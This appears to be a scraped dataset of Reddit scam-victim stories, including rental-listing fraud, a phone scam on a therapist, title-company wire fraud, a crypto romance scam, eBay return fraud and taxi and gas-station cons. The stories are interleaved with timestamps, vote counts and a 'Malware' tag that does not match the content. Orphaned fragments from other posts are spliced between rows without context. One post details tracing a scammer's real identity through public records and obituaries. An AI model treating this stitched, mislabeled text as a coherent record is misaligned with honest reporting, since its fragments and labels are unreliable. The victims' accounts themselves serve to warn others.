Been here long enough to know instantly that was a scam.  Asked my better half and she remembered the company's name. Looked it up on the county records to confirm.  We called the company and let them know about the fake listing. I'm guessing they changed the code, almost every daylight hour since someone has been standing outside unable to get in for their ""tour"".  I've now stopped over a handful of people from getting scammed.  Some have driven over 2 hours to see this place. 

I stuck some signs up on the door warning of the fake listing, with the company's approval.  Reported the fake listings I found on rent.com and apartmentfinder. They're still up.

She's a mental health professional, and got hit with [this scam](https://www.sfchronicle.com/bayarea/article/phone-scam-therapists-16483251.php), almost to a t. The scammer kept her on the line for over 8 hours, during which time she drove to multiple bank branches, withdrew multiple large sums of cash, and then drove to multiple pharmacies in the city to buy gift cards. She bought a total of 20 giftcards, each $500, and then sat in a parking lot and read off the numbers to the scammer. The scammer ended the ordeal by having her go to a police station, where she realized what had happened, broke down, and it was then that I was contacted by the PD.

Suffice it to say that this was an extremely advanced scam, that uses high-level psychological tactics to break down people's defenses, and get them to do things they wouldn't normally. My wife isn't a stupid person, she's earned a doctorate, is successful in her practice, but was clearly uniquely vulnerable to this sort of thing.  She's been left traumatized from the ordeal, ashamed of what happened, and the horror of losing a huge sum of money is beginning to dawn on her. We aren't rich people, and this hurts, and will hurt us. We have a 2 yo as well, and our family is in full blown crisis right now.

I don't know what to do. I'm scared for us. I'm feel horribly for my wife, and know that she just got psychologically brutalized. To be honest, I'm incredibly angry at her as well. During the whole ordeal, she didn't call me once, and I didn't know where she was or what was happening, and was taking care of our child. She gave the scammer my information, so she's put me in harm's way, and has also likely put our child in harm's way. I feel like we're marked now, on top of everything. We've been alternating between crying, scared, fighting, and are in shock.

I don't know how to be supportive right now, and am so mad that she's done this to our family. I'm seriously considering leaving her, at least temporarily, until we can find steady ground again. I have some shame feeling this way, I feel like I should have unending sympathy and support for her... but I just don't. She dragged me and our child into this, didn't stop to think, and harmed us all. I feel horrible saying this, but it makes me question our future together. We've been scrupulously budgeting for years, saving money wherever we can, and 10 grand disappeared overnight.

It sounded like he was downstairs in the kitchen. He was talking loudly, sounding frustrated, but it was a one-sided conversation. I figured he was on the phone with someone, but I couldn't make out his words.

After a minute or two, I went downstairs. When he saw me, he said, ""Honey! We have a dishwasher in Ohio! We were charged $400 for it!""

I asked him, ""Why are you trying to buy a dishwasher?"" (Ours is less than three years old)

He replied, ""I'm not!"" and he waved me off.

I went back upstairs, back to bed (I worked the night shift last night), but I could still hear his increasingly loud and frustrated voice, so I went back down. I just sat next to him and listened for a few minutes. 

I finally figured out that someone had contacted him that he had purchased a dishwasher through Amazon, but it was stuck in transit in Ohio (we live in Arizona). Side note: the email sender was not Amazon, but a jumble of letters and numbers. Anyway, they were trying to get him to install an app that would let them control his phone so they could access his bank account to ""reverse"" the transaction. 

Finally, I said to him, ""Show me the charge they are trying to reverse."" He told the caller to hold on a minute. He showed me an email whose sender name started ""jxtsg"" and I said, ""You are getting scammed!"" so he hung up. 

Of course, ""Amazon"" never contacted him again, but I think they were trying to get access to our bank account!

1685212142.0,Someone is running a scam on our house...but I don't understand the scam,"Yesterday people started showing up at our house (we own it) saying they had an appointment with a ""Smith"" to tour it for rent. They all contacted him through a ""button"" on Zillow and Trulia. By the time these folks showed it to us the button was gone but ""Smith"" kept texting them to go look at the house.

The rent was way below market, so the scammer got that part right, but for all these people they came to discover they had been scammed without paying a dime. They were all locals. 

We asked to see the communications between them and the scammer so we called the scammer ourselves and pretended to be interested renters. He gave us an appointment and just like the other folks he never showed and then didn't respond after that.

So what's going on here? How does this scammer make any money? Is he just polite to locals to keep up the scam but then he pounces on the interested renters that aren't local and then scams them out of a zelle deposit or something? He is using interior photos from a house down the street that's for sale right now so the photos show an empty home. But in person all these people realize that the exterior and interior are two different (but similar) homes. So is he just weeding out false positives hoping to find someone out of state?

We have already taken down the ""rental"" listings that we found, but what else can we do? As of 20 mins ago this guy still answers new phone calls about the ""rental"" ... Can we report the number to telecom companies? What can we do? We are worried about our own safety as well as the folks getting scammed.

UPDATE: okay, so I never expected this many responses, thank you all for your thoughts. We have reported this to the FTC, our neighborhood council president, Zillow, Google,  our local police department officers, and informed our neighbors. We already had our home ""claimed"" on Zillow before this so it's unclear how the listing even happened, but Zillow is ""investigating.""  It's been 24 hours now since anyone has shown up for an appointment so those are likely over, we are just hoping there isn't a victim that will show up with a U-Haul on the first.

UPDATE #2: Zillow finished their investigation and emailed me ....but with a completely different address and incident date. So ...yeah, they obviously care a lot about this problem. They also made no changes to the listing except make it not a currently for rent  listing. Even though I have claimed the house I am unable to remove the photos (the listing had photos from two different homes in it) or anything...so I have opened another request for that.

The police had fun pointing us in ten different directions without doing anything at all themselves. We submitted an official report for identity theft as that's the closest thing the city attorney and officers thought might fit the laws potentially broken. Essentially WE can't really expect the police to do much because we didn't lose any money, the person that (hopefully doesn't) show up with a U-Haul out 5 grand will have to talk to the police to expect any movement.",Malware,3073,550,82,0

Or are they not able to use the phone since it's marked as lost, and I should keep it connected to iCloud so they're unable to gain access?

1664376093.0,I was just scammed out of $100k through title company wire fraud,"*Final Update*
I got my money back after 3 months, it just showed up in my account with an email from BoA saying they recovered the money and resolved the case. 


__________________

I really don't want to tell this story but if I had seen it before I may have done something different. This just went down yesterday.

We were buying a house this week, a rental property and were putting 25% down (around $100k). We had gotten a couple of emails from the title company about docs and stuff then I got one asking to put the closing cost in escrow. They sent wire transfer info and me not suspecting anything wrong followed through. I didn't know what the exact closing cost amount was and had to ask them and they actually had the right amount(?). They had sent us a Clear to Close email and all that so they knew we were closing this week and they knew who our real estate agent was (who was also fooled). The wire was to a Bank of America account (which I use myself) so I wasn't too worried. The next day alarms were going off from our mortgage company when we asked about it.

The person that did this convincingly impersonated the title company agent (the emails were almost identical to the earlier ones but of course they subtly switched the email address and changed the phone numbers in the signature section). I had no reason to suspect this was a different person and they somehow knew our closing cost which we are still trying to find out how. My wife takes care of the details and I just usually sign stuff and pay so I thought everything was legit.

I called BoA (2 hr hold) and they couldn't reverse it since it was the next day and said I had to sign some form before trying to recover the wire. I made a police report and reported it to the FTC/FBI but odds are the money's gone unless BoA can do some magic which I'm not expecting. 

One odd note, the people we were buying the house from only had one stipulation; that we use their title company. We didn't care because who cares what title company you use but we did think it was odd that they cared. 

I've been on this sub for a while and should have seen it coming but I didn't expect it could happen to me and definitely didn't expect this level of sophistication. They send you warnings about wire fraud but they don't warn you about how they do it. We'll be fine, just to accept I got...got.

ETA

Update:
The bank it was wired to was in Houston so we had someone go to the bank itself and get the bank manager on the phone (they weren't picking up our calls). They told us the account was already flagged because of the wire amount and the money from the wire was still in the account. They couldn't go into details but implied the account was frozen so the chances of us getting it back just went up but it may take a while because they need to do their DD and all. Looks like we caught it in time thankfully but of course there's no guarantees.

She's gone.  The police were able to eventually find her in the hotel, checked in under a false name.  She convinced them she knew exactly what she is doing and is of sound mind.  They can't stop her, she's not doing anything illegal.

I found from her bank that they had also contacted the police last week as they were very concerned about her behaviour.  The police visited mum and she told them to fuck off and mind their own business.

I know she is a victim in this but I can't help but think how callous and calculated she's been in all this.  Keeping it all a secret.  Abandoning her children, her grandchildren, her great grandchildren, who all love her very much.  Does she truly believe in her actions?

We received a letter from her yesterday, posted before she left.  Apparently her flat has two week's rent paid and then the lease ends.  We have that time to sell/donate/take everything from the flat.  All our family photos are still there on the sideboard.

I don't know what's going to happen to her.  When she gets there, will there be anyone waiting for her?  If they want ransom, nobody in our family has the ability to pay.  If she decides to come home, we would struggle to find the money for that, let alone then finding her somewhere to live.

I'm sorry this isn't a happy ending.  I have cried a lot and will cry more.  This is worse than if she had just died, everyone goes through the death of their parents, but what she's putting us through, what she's been convinced is the right thing to put us through, is worse.

Her letter says she will stay in touch through Facebook messenger, and that she hopes we can forgive and support her.  I can only hope that we're wrong, only hope that everyone is wrong, and that she will find that wonderful new life she has been told awaits her.

Thank you all for your kind words.  Please look after your parents.

1685016847.0,Scammer convinced the bank teller they were me,"I'm still shocked that this even happened and especially disturbed that my bank basically assisted this identity thief. First time doing a long story like this, so here we go. Also on mobile so sorry for the formatting. 

Yesterday around 1pm I received a text message from my bank that my primary email address hadbeen updated and to call if I did not make this change. The text didn't provide a link to click but a phone number and reference number. Being the paranoid guy I am, I decided not to call the number but check my online banking app first, thinking the phone number might be fake or a scam of some kind. So I go ahead and open my online banking app to find that my email address had been changed, my home address had been changed, and a work phone number that I had left blank on purpose had also been added. I did not think to take a screenshot of the information that was changed at the time or write it down for my own records. A little panicked, I used the banking app to change the above personal information to the correct personal information. I then changed my password for my banking app. I made sure that I did not misplace or lose any debit or credit cards, all are accounted for. I check all my bank accounts, credit card statements and everything is good, no money lost or unaccountable spending. No new loans or credit card applications. I feel safe and satisfied and like I've solved the problem. I let my fiancee know of the weird situation that just occurred. She's typically more cautious about stuff than I am and tends to worry more between the two of us. She urges me to call the bank anyway just to be on the safe side. I am so thankful I listened to her. 

So I fire up the banking app again and called my bank's fraud support. After a lengthy discussion, Iwas informed that sometime on the previous day, someone had visited a physical bank location in my city and made personal information changes with the help of the employees. I was shocked. I asked the fraud support member how that would be possible if I didn't lose any of my bank cards? They informed me it looked like they used personal ID to change the information. I quickly check my wallet and verify that I still have my driver's license and all other forms of personal ID. The fraud support member then directed me to head over to a physical bank location in order to secure my account and personal information. 

I arrived at the bank and was quickly assisted and was given more details about my compromised information. A bank branch employee told me that someone had visited a different branch of my bank in my city, one I have never personally visited the day before yesterday. I confirmed that I had not visited the bank at that time or location as I would have been sleeping and preparing for my night shift. The individual had then used a drivers license from a different province (I'm Canadian) and personal Military identification with my name, information, and likeness in order to change my personal information including email, home mailing address, and phone number. The staff members confirmed that the only way this information could have been changed was if an individual walked into the bank with ID and convinced the bank teller they were me. 

I confirmed with the bank staff that I have never had a valid driver's license from another province but had previous service in the military, however was no longer serving. The bank teller then provided the military service number that was used by the scammer and it didn't at all match my military service number. It was also confirmed that  at this time there had been no money lost, credit card applications etc. attempted. I made sure to let my bank know that I would like my account flagged and identification checked every time I visit a branch in person, and my only forms of identification that should be deemed accepted. They agreed it would be for the best. The said they would be making phone calls to the branch that allowed my information to be changed to sort out how this could even happen. I was then advised by the bank staff member to make a police report which I absolutely did.

I plan on returning to the bank later today to follow up. I'm also going to inquire about monitoring my credit score. I feel like if someone went to all the trouble of making two ID's they might try to get a car loan or a phone plan in my name and not ever pay the bills. Meanwhile the bill might be sent to this made up address somewhere else as used on the false ID's. I also seriously hope that they discipline or even fire the employee who helped this scammer do all of this in person. Anyways thanks for reading Reddit, you're the best.

1677400066.0,Got caught in a pig butchering scam. Sharing my story to help others.,"Im a 28 year old female from Australia. I decided to go dating online using Bumble after my breakup with my ex 7 months ago. I believed I was healed and excited to find someone, I knew what I wanted in my next relationship. The first day I was on there, I matched with a good looking Malaysian-Chinese man.

We chatted for an hour on the app and moved on quickly to use Whatsapp. He apparently fell in love with me after 3 days of chatting with me, and proceeded to love bomb me, promised me the world, wanted to make me his woman, give me everything he owns when we get married. Initially this was too much for me and I confronted him about it. He said he understands but its how he shows his love. He respected my boundaries, gave me a lot of compliments, promised me a bright future, encouraged my ideas and plans etc. I liked talking to him every night, this was all over text. We called once or twice but he was usually too 'shy' or 'nervous' to speak to me on the phone and meet up. I was also a shy and anxious person so I understood.

We then started to speak about his tough childhood growing up and his journey into investing. I was into property investing and understood basics of stocks and crypto. He told me about how he makes money by placing most of his savings in a mining pool, which generates roughly $7K a day. He has been doing it for an entire year. He showed the screenshots as proof, and the amount he had in his savings. I believed it and so when he asked about my finances, I told him about it without thinking too much since he was also open about all of his finances. He convinced me to put my savings in a mining pool so we can both we financially free together so I did that. Initially it was $8K usd.

Over the next week, I was able to see returns of about $400 a day. He mentioned that these mining pools are great, but they don't last long. This particular pool will end in 2 months. This baited me to put in most of my savings. I liquidated my stock and crypto assets, and stupidly added it to the wallet, totalling $60K usd.

Then the mining pool sent out a notification to join this 'Couple activity' and pledge your funds to the pool for greater returns. The guy I was talking to mentioned how we have enough funds to join this activity since the requirement was wallets totalling $300K usd. Once we joined, he panicked and realised that to complete this activity, and release the funds, each account needed to have $150K usd. We didn't understand the requirements fully. I just jumped into it without thinking. He then reassured me thats its fine and its possible to get this money. We just need a plan.

He told me he was short on money and was unable to help me at the moment, but he‚Äôs trying his best to do everything he can to make this problem go away quickly so we can finally have our first date. His friends won't be able to assist. He has a bad record with the bank so he can't get a loan. Trying to convince me that he's exhausted all his options and no one can help him. He's so tired from working 12 hour days, telling me that his only motivation  to work is because of me. I brighten up his day etc. Don't think too much about the problem, let's be optimistic he would always say.

I was reassured by the customer support team and him, that this was all we needed to do to get our funds back. He said he has done it multiple times before but only participated individually, however the rules have now changed.

My stupid ass decided to add in all of my savings to this pool,  apply for a personal loan and borrow money from my parents to make up this total, because there was no other option else I'd lose it in a couple of days. I made it happen, completed this activity, but was told that I needed 30% of the $150K in my wallet to 'open the release fund channel' to withdraw these funds. After hearing this and confronting him about it, he said he had forgotten this was a requirement when he participated before but promised that this was all we need to do to get our money back.

By then, I realised this was all a scam and started to find similar scams to this. I've also checked the wallet address he apparently pledged with me, and realised that no such funds were taken out like they did with mine. I lied to him that I had the money to withdraw the funds, but he had to prove to me that I was going to get this money back. He instantly flipped, turned on me, gaslighted me about how I don't trust him after everything we've been through.

I never thought I'd be one to fall for one this badly, and lose so much. I work in IT and am usually so careful when it comes to these things. I went through feelings of self-blame, shame, guilt, depression and embarrassment. I was stressing out so much over my job before and thought about leaving but now I have no choice but to work to keep up with my mortgage repayments. This situation messed me up really badly, and also caused me to have a lot of trust issues and not ever want to date again. There were so many red flags I missed but now see clearly. I was also isolated to not talk about this situation with my friends and parents because 'they wouldn't understand it' and 'we can fix this problem ourselves' so I shouldn't worry them with our matters.

I've seen a psychologist about this and spoke openly with my parents and friends about it to start the healing journey, but I'm still fairly shocked that it happened over a short amount of time. I save every dollar and don't spoil myself at all, so this loss was painful. As a result of this, my parents are now having to revise their finances to retire comfortably. I understand that I was a victim of this and that these scammers use strong psychological tactics to bait you into getting scammed but my guilt is eating me up every time I see them stress out about their finances.

I've reported this to the police but I've accepted that this money is lost forever and I won't be able to get it back. I'm hoping that sharing my story can stop others from making the same mistake.

EDIT: Thank you everyone for your supportive comments. They're greatly appreciated and they do bring me a lot comfort to what has happened. 

With regards to the comments on how stupid it was of me to fall for this. I can understand that. I believe a part of the reason was due to my first time ever online dating, and recently getting out of a very long-term relationship with a lot of wounds and a low self-esteem. I've definitely learned a hard lesson after this experience, and will definitely work to strengthen other parts of my life first before ever looking for a relationship again.",Malware,6635,1258,149,0

Just goes on and on. So many lies about the hospitals too as I tried to tell her the hospital name didn't exist but she wouldn't listen to anything.

Anyway, so she is in Kenya now. She has just left swish hotel to go to a house. Who's house? I don't know. Today she sends pictures that she finally met his daughter. Apparently the daughter has been living at his sister's house but came to meet her today. Also, in an incredible twist of fate, the mother of his daughter, who abandoned her at birth, now wants her back and is taking her back to the USA where she lives and works as a Dr. Seriously, this story is so twisted..

A man comes up to my dad and says his card was charged for his gas and our gas since we pulled up at the pump after him (supposedly). He shows me an bank account charge for the exact change of how much I pulled from the pump. 

However I remember putting in my card and the machine and it was not in the middle of a transaction when I arrived. The hose was in its holster and the machine approved my card. 

The guy wanted us the go into the gas station and reverse the charge. I understand it doesn‚Äôt work like that and I say no. I am guessing he will ask for the money in cash or something. I refuse and tell him I don‚Äôt know him and I put in my card and I am confident it charged my card.  

Here‚Äôs the kicker. I was not charged by the gas station right away. I almost thought he was telling the truth until I realized some transaction of mine charge me at a later point. For example sometimes I see I get charged hours or even a day later. 

He threatened to call the police and took photos of my car to intimidate me. This was all for $16 I put into my car. I refused and said please call them and then I left. He walked away pretty quick before that. 

I still haven‚Äôt been charged on my card but it‚Äôs only been an hour.

1689714138.0,Women asked to use my motel bathroom,"I was on vacation in a beach area with my family. Walking back to the motel, my wife stopped by the car parked in the motel lot. I was taking my kid by to the room. A women approached me on the motel property and asked if she could use my bathroom. I said no go to the front desk area, there is a bathroom there you can use. She was like no I need to use yours its more private. I said no sorry I don't let strangers into my room and my wife wouldn't be too happy with that. I walked away but she kept following me up the stairs. Then I turned just went to the elevator on the next floor and took it back all the way down. She didn't enter., I walked to my wife and told her to wait for a bit. After 15 mins, I took the elevator back up to my floor didn't see her and hurried into the room.

1601756336.0,19F got scammed by a 33M Army vet. Then I tracked him down to get what is mine.,"Well Reddit, 

This will be my second post. Only a mere 12 hours later. Apologies for the dramatic title, I feel just a tad proud. This is a follow up to my original post https://www.reddit.com/r/personalfinance/comments/j4cqb2/am_i_being_scammed_or_am_i_just_paranoid/?utm_source=share&amp;utm_medium=ios_app&amp;utm_name=iossmf i put up on a different subreddit. 

Edit: OG post got deleted. I‚Äôll give a tl;dr here of my original post. Basically I got swayed by a really good price for a Macbook on fb marketplace. Seller had a pretty established FB profile but with very restricted view. No friend list, several photos (most were stock photos), some info about his job (useless in the end), his school district and alma mater. We compromised by having me pay half upfront, half when I received it. I got tricked into thinking this was a good idea. Well, guess it wasn‚Äôt.  Sent my half, seller ran. 

When I realized I had been scammed, I felt like throwing up. I felt more stupid than I ever had in my life. I couldn‚Äôt even tell my boyfriend what happened because of how embarrassing and ridiculous all of it was. My boyfriend kept telling me to take this as a lesson and let it go. But how could I? So I did not. I put on my thinking cap and begun digging. At this point, he had deleted his facebook profile, the one lead I had. I realized his convincing facebook was mostly faked. Most photos were stock photos (and maybe a profile photo which was a group photo, he was in it) and information like his job was practically useless. He also had faked his address, name, phone number, etc. His iMessage was linked to an email and not phone number. That email is also a dead email. I will expand on this later. And my dumbass took ZERO screenshots of anything at all. Fortunately, I have pretty much memorized every little detail on his profile. 

I had stated in my previous post that I had managed to find what I assumed was his real name just minutes before he dipped. So that became my first tip. I plugged everything to google. My first score was googling one of his stage names (he had two) and found a really blurry photo of him from soundcloud, good enough. Google image search did not help. Next, I googled his REAL name next to his stage name (he is now some type of soundcloud/no name DJ/music producer). I found a contract between him and an old manager that had been posted online. His address was listed on it. And what do you know! It was the SAME STREET (different house number) as the address he put up on the fake shipping label he sent me (btw the address on the shipping label is a vacant, for sale house I found out). Bingo. Then I googled the address to reverse check it. Multiple websites, most notably, his state‚Äôs database (based on voter registration) pulled up the current occupants of the home, including his name. I‚Äôm convinced this can‚Äôt possibly be a coincidence. But I had to have more evidence. I googled every single occupant of the house and one turned out to have died back in 2009 (Lets call them A). I found A‚Äôs obituary. In it, was everyone‚Äôs name. Then I googled A next to state. Again, it verified that A‚Äôs name was listed as the owner of the scammer‚Äôs exact home address. Found out later A is scammer‚Äôs grandmother. 

The tricky part is realizing that scammer and dad had the exact same name. One is a senior, the other junior but I found this out way later. When I googled scammer‚Äôs name, I also kept getting dad‚Äôs information. So I always end up second guessing myself. My jackpot was plugging the full name including middle name which I did not know before, obtained through obituary, onto facebook. Pulled up dad‚Äôs profile. Dad‚Äôs facebook is quite active. I almost thought I had gotten the wrong guy all along because obviously, dad looked very old and it just was not the right guy based on the soundcloud photo. But, my gut said to look further so I scrolled and scrolled and scrolled and found gold. A happy birthday post to his son the scammer. He uploaded a bunch of pictures of scammer, INCLUDING the exact same one I had found on soundcloud earlier. I have never felt more relieved. All of my research was not in vain. Now that I have compiled enough information, its go time. I thought about emailing the email tied to his iMessage but I figured this was useless. He had faked everything else, this email must have been just as useless if he so willingly showed it. So I went back to the contract I found earlier and found his REAL email address. Thought emailing him there would make this even better. 

This is what I wrote to him: https://imgur.com/a/DCLXbxt

I also hit up dad and explained to him everything. Dad was a real cool guy. Dad apologized and sought to make it right. 

Well.... an hour later: https://imgur.com/a/cUkHp9N
and finally: https://imgur.com/a/mJSQ0TG

Well there ya go. I‚Äôm sorry if this was anti climactic. I had fun though and all is well in the end. :)

Edit: To avoid confusion, the real amount is indeed $650. I know in my original post I said $700, but this was just rounding up.

Edit 2: Hey guys! I just thought about including this. I guess I never really explained the US Army bit, I included that in the title for shits and giggles tbh, this wasn‚Äôt a huge point to the story or anything but! i thought this would be a fun bit. He bragged about being in the Army while I was still chatting with him the night I paid him. See how he kept telling me to pay up? This gave me some sense of comfort that he wasn‚Äôt messing around. But alas, he was. Here‚Äôs the chat: https://imgur.com/a/cSpjAj6
In the end, this bit helped me a little. Remember I said I found dad‚Äôs happy birthday post? Well one of the photo was also him in uniform which just convinced me further I got the right guy, next to the soundcloud photo of course! :)

Edit 3: HOW I GOT HIS NAME! Ahhhhh! Can‚Äôt believe I forgot to mention this!!!! So its actually pretty easy. The fake name he used was really really generic. Any google search of that name would give you 8273837392 results so it dawned on me that it might just be...fake. I don‚Äôt know why I had the feeling. Well, I found this out before I even found out I had been scammed (look at my first reddit post linked above). This is how I found out: I was scrolling through his entire profile, and clicked on every single photos he had posted that would pop up in his TL. most photos were like photos of captain america, flags, things like that. i clicked on EVERY SINGLE LIKE, and EVERY SINGLE COMMENT to get SOMETHING. Well one of the photos, it was a flag. I‚Äôm going to try to explain it so it make sense, so when someone comments under a photo and then the poster (in this case, scammer) respond, they will tag the commenter right? and then if its a conversation, they keep tagging each other so like ‚ÄúJohn Smith Nice flag!‚Äù
‚ÄúJane Doe thanks!‚Äù 
‚ÄúJohn Smith no prob‚Äù 
Like that. and the tag was HIS REAL NAME different from the one listed on facebook.

I shared and reported and every post got removed for saying the name of the account.

1623377820.0,Gas station scam,"TLDR; gas station attendant tried to scam me into paying an extra $20 claiming there was a mistake, despite my card statement saying I paid the correct amount. 

So I was far away from home on a business trip, via car. On the way home I stopped at a  relatively small gas station. I didn't need gas yet but it was populated and being from out of town I thought it would be pretty safe. Being a small person, I'm fairly aware of what's going on around me- I pulled up to pump 1, someone in front of me pulled up to pump 3, and there was someone at pump 5 already pumping their gas. 

After I fill up and I'm about to drive off, the attendant comes out looking angry and waving his hands. He comes up and says that the person on pump 5 accidentally put $20 on pump 1 and that when I filled up I used his $20 towards my gas and I needed to come in and pay the difference. I thought that was pretty weird because the person from pump 5 was long gone. I said okay well let me check my bank account. I checked and it matched my receipt of $36. I told him that and he said no you used $56 worth of gas. 

I have a relatively small tank and I was about a 3rd full to begin with so I told him it was impossible for me to have used that much gas because my tank wouldn't hold it. He started screaming at me that I'm stealing from him and gathered a lot of attention that there was ""someone stealing gas"". I kept repeating that my car wouldn't hold that much gas and the cost/gallons shown on my receipt line up with how much my tank needed. He continued screaming that I wasn't allowed to leave until I paid and had another attendant stand in front of my car while he took a picture of my license plate and said if I leave he would call the police on me for theft. I told him I'd do him one better, I'd call the police for him right now so we can go ahead and settle this. 

So he went back inside and I called. He comes back outside a few minutes later to tell me ""I'm in luck"" because someone has ""paid my debt"" and I ""can leave"". I tell him no, the police have already been called and we can settle it when they get here. He insists that I leave and to tell the police not to come and that everything is ""fine"" now. I'm not one to call the police over what feels like a petty $20 but at this point with his picture of my license plate, I don't trust him to not call them after I leave so I wait for them.

Once the police get there and speak to him he says ""oh it was a mistake I thought they were someone else who was stealing from me"" and due to lack of evidence that they were trying to scam me that's where it ended. I have never experienced something so aggressive and bizarre but apparently some small gas station owners will try to con people out of money with claims like that. After looking at reviews, I'm not the first person they've scammed/tried to scam either. At first I thought it was an honest misunderstanding but after reading the reviews and him back pedaling after I called the police, I have no doubt he was trying to scam me.

1617077831.0,I have been buying and selling tech on the internet for 10 years and I'm the victim of a sophisticated scam on eBay. This is what happened and this is what I learned (eBay return fraud),"[**Part 2 of this story is here**](https://www.reddit.com/r/Scams/comments/mz5amg/update_with_good_news_i_have_been_buying_and/)

March 6: I listed a Samsung Galaxy Watch Active2 on eBay with a price of $179. [Here is the listing for the watch that I sold](https://www.ebay.com/itm/Samsung-Galaxy-Watch-Active2-Black-44mm-with-LTE/353411193927)

March  7: Someone purchased the watch. The address was listed as Fisher,  Illinois. I noticed that the buyer was a brand new account and it was  made on March 7, with 0 feedback.

March 8: I shipped out the package.

March  15: The buyer made a return request and claimed that the touch bezel  for the watch is broken. I sent a link to the buyer telling them how to  turn on the touch bezel, and to respond if they still need a refund.  Even though I did not accept returns, buyers can return an item if they  claim it does not work.

March 18:  The buyer asked eBay to step in and make a decision about the return.  eBay sided with the buyer and the buyer was told to return the item.

March  24: The tracking information was updated and it showed that the item  was picked up in Ladson, South Carolina. The return came from South  Carolina even though I shipped the item to Illinois.

March 26: USPS tracking said the item was delivered to my address. I checked the mail and I did not find any package. [Here is the tracking information for the package](https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&tLc=2&text28777=&tLabels=9302020585500041261238%2C&tABt=false)

March  27: I called USPS and asked why the package was not delivered. After a  few minutes on hold, the clerk came back and told me that the package  was not delivered to my address, it was delivered to a different address  on the same street, because the shipping label had 37xx Avenue instead  of my address, which is 75xx (numbers have been altered for anonymity).  The clerk also told me that the mail carrier is a veteran with 20+ years  of experience, and it is unlikely that he/she made a mistake.

March  27: I made an appeal to eBay and I wrote in my appeal that: (1) The  item was not returned to my address, it was returned to a different  address on my street (2) I did not receive any package from the buyer,  and I do not have the Samsung Galaxy Watch that I sold (3) The return  package was picked up in South Carolina even though I sent the package  to Illinois, and the two places are \~800 miles away from each other (4)  The seller is a brand new eBay account with 0 feedback.

March  27: eBay made a decision in the appeal and sided with the buyer,  because the tracking information said that the item was delivered. eBay  believed that the item was delivered even when the package did not  arrive at my address.

March 29: I  went to my local Post Office and asked the employees if they could  provide me a picture of the shipping label when it was scanned into my  local Post Office. They were able to give me a picture. [Here is a picture of the scanned shipping label.](https://i.imgur.com/0tQ88kd.jpeg)  The receiving address was not my address, it was an address 2-3 miles  away from my house. The sending address was neither Illinois nor South  Carolina, it was New York, even though USPS scanned the item and picked  it up in SC.

March 29: I have  contacted eBay with a picture of the shipping label but eBay says an  appeal can only be made one time. I had told eBay during my original  appeal that USPS said the item was delivered to a different address and  not my address, but that was not enough, and I am not being allowed to  add information to my appeal.

Right  now: I do not have the Samsung Galaxy Watch that I sold to the buyer,  and eBay is telling me I have to pay $183 ($179 for the watch and $4 for  the buyer's return shipping).

**What did I learn from my experience?**

1. It  doesn't matter if you are selling an item and say ""Buyer does not  accept returns"". The buyer can create any reason to return an item and  eBay will not ask the buyer for proof.
2. A  buyer does not have to return an item to your street address, the  return can go to any address in your city and ZIP code and eBay will  assume that the address is correct
3. If  you make an appeal to eBay, make sure you have physical proof that the  item was not delivered to your address, and provide that information  with your appeal. An appeal can only be made one time and within 30 days  of eBay making a final decision.
4. The  tracking information on the USPS website does NOT have to match the  shipping label that the buyer puts on the package. USPS will deliver a  package to the address written on the package, not the address in the  computer database.
5. Beware of new eBay accounts with 0 feedback! They might try to scam you like they did to me :(

**What should you do if this happens to you?**

* No matter how tempting it is, do not immediately send an appeal to eBay. Wait and gather all of the evidence that you can gather to prove that you are being scammed. You have up to 30 days to make an appeal but you can only appeal one time
* Have physical proof that the package was not delivered to your address. Out of all the evidence that can be shown, I think this is the strongest kind.
* Understand that 100% of the work will fall on you. eBay is extremely accommodating to buyers, even buyers with brand new eBay accounts and three different addresses.

I was sitting in my car parked and the person next to me pulled out of their parking spot, scraping the back of their car with the front of mine.

1607026597.0,[SCAM] Taxi driver rushing to the hospital.,"I feel like an absolute moron for falling for this. 

Backstory:

I live in an incredibly crowded city, and got into a cab during a busy hour. I was with my bf and siblings on our way back home.

We get into this taxi, and the driver looks very shaken, keeps checking phone. His phone rings, he picks it up, and after a few mumbles from the other starts yelling ‚Äúwhat? BUT IT‚ÄôS NOT TIME YET‚Äù so obviously my ears perk up. He starts to sob and hangs up, and says ‚ÄúYou have brought me good fortune, my wife is giving birth! ‚Äú, so we‚Äôre all ecstatic. He goes on to tell us that he has wanted a kid with his wife for 13 years and how they had a miscarriage, how he‚Äôs so excited to be a father, how the baby wasn‚Äôt due for another 2 months and had lung issues but he should be fine now. 

Cue another phone call. Chatter from the other end, his voice drops, ‚ÄúI can‚Äôt afford that‚Äù, (chatter) ‚ÄúWhat are we going to do?‚Äù ‚ÄúNo we can‚Äôt, I don‚Äôt have the money...I‚Äôll drop my customer off and I‚Äôll be on my way... We aren‚Äôt prepared...‚Äù

Obviously, we‚Äôre all invested in this dude‚Äôs baby. I ask him if everything is okay. He‚Äôs now crying in a way which is gut wrenching, they will have to keep the baby in an incubator, which he will have to buy, and his wife has to have a c section. No, his insurance doesn‚Äôt cover for these things and they‚Äôll have to wait in line. He cant go to a private hospital, he‚Äôs in a lot of debt, but no, please don‚Äôt worry about him, he‚Äôs always found his way. We are all very distressed, and yet we assure him his baby will be fine. We will most definitely hold him in our thoughts and wish him very well. The guy asks if we‚Äôre okay to walk home, he has to rush to the hospital. Of course, we say, your baby will be fine, have faith. He‚Äôs telling us the cost of our ride - somewhere around 25 - and we gave him 200, because come on, the guy is in debt and is about to be a father, we‚Äôre very worried and also happy for him. 

He‚Äôs looking incredibly thankful as well as embarrassed to take the money and rushes off immediately. We‚Äôre all feeling amazing, very blessed to take part in such an exciting moment in someone‚Äôs life. We talk about it for weeks and kept wishing the baby well amongst each other. 

Well, back to tonight. 

After a very long day looking forward to nothing more than to get back home, I haul a taxi. The guy looks completely fine until I get in the car. It‚Äôs traffic hour again, and as soon as we move his phone calls. 

Similar blabbering. 

Cue the waterworks, he says to the person on the phone ‚ÄúShe‚Äôs not due yet! What hospital?‚Äù. 

I‚Äôm already feeling very very odd, like I‚Äôm in a deja vu, except I know for a fact it‚Äôs not. He hangs up and turns around, and says, ‚ÄúYou have brought me good fortune, my wife is giving birth!‚Äù - WORD. BY. WORD. THE EXACT REPLICA OF WHAT THAT OTHER DUDE HAD SAID. I thought, what are the odds of this? No. This can‚Äôt be a coincidence. I got paranoid thinking I landed the same taxi driver, who had some mental disorder and lived his life in the limbo of his wife being in labor but never delivering. But no, his voice was different, and the other guy was balding, but this driver had a reasonable amount of hair. 

I‚Äôm in complete disbelief. I was just quiet, all I could do is my best impression of Owen Wilson: ‚ÄúWow.‚Äù 

